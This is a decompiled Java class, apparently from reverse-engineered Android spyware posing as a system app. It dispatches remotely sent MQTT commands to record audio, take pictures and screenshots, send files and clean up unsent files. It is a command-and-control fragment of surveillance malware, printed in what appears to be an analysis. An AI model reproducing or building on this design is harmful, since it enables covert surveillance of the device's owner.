package com.app.system.common.commands;

import android.content.Context;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommandReply;
import java.util.HashMap;

public class CommandDispatcher
{
  private static final HashMap<String, Command.Factory> COMMANDS = new HashMap();
  public static final String TAG = "CommandDispatcher";
  
  static
  {
    COMMANDS.put("AUDIO_REC_INFO", AudioRecInfo.sFactory);
    COMMANDS.put("START_AUDIO_REC", StartAudioRec.sFactory);
    COMMANDS.put("STOP_AUDIO_REC", StopAudioRec.sFactory);
    COMMANDS.put("PLAN_AUDIO_REC", PlanAudioRec.sFactory);
    COMMANDS.put("CANCEL_AUDIO_REC", CancelAudioRec.sFactory);
    COMMANDS.put("TAKE_PICTURE", TakePicture.sFactory);
    COMMANDS.put("TAKE_SCREENSHOT", TakeScreenshot.sFactory);
    COMMANDS.put("SEND_FILE", SendFile.sFactory);
    COMMANDS.put("CLEAN_MATTER_FILES", CleanUnsentFilesList.sFactory);
  }
  
  public static MqttCommandReply a(Context paramContext, MqttCommand paramMqttCommand)
  {
    MqttCommandReply localMqttCommandReply = paramMqttCommand.b(paramContext);
    Command.Factory localFactory = (Command.Factory)COMMANDS.get(paramMqttCommand.comando);
    if (localFactory != null) {
      return localFactory.a(paramMqttCommand).a(paramContext);
    }
    localMqttCommandReply.result = 311;
    localMqttCommandReply.replyText = "Comando non valido";
    return localMqttCommandReply;
  }
}


/* Location:              ~/com/app/system/common/commands/CommandDispatcher.class
 *
 * Reversed by:           J
 */